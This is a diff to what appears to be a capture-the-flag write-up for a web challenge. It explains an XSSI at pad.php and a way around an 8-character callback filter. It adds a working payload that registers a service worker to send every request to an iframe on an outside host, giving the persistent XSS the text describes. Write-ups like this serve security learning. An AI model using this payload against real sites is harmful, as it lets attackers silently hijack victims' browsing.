@@ -38,7 +38,18 @@ We can perform XSS attack on `embed.php`, but we can not trigger it from the pat
 
 We can easily find out there is XSSi at `pad.php`, but `callback` parameter is filterd and can not be longer than 8 characters. 
 
-To bypass it, create a blog post with title like: ```;...javascript...//`
+To bypass it, create a blog post with title like:
+```javascript
+`; ... javascript ... //
+```
+
+In [solve.py](solve.py), I have been using as the following:
+```javascript
+`;onfetch=(e)=>{e.respondWith(new Response('<iframe src=//l4w.io>',{headers:{'Content-Type':'text/html'}}))}//
+```
+
+To setup ServiceWorker later then get persistent XSS (Imagine that, from now on, victim always get into your evil page, then you can silently control the pages).
+
 
 ## Root cause
 
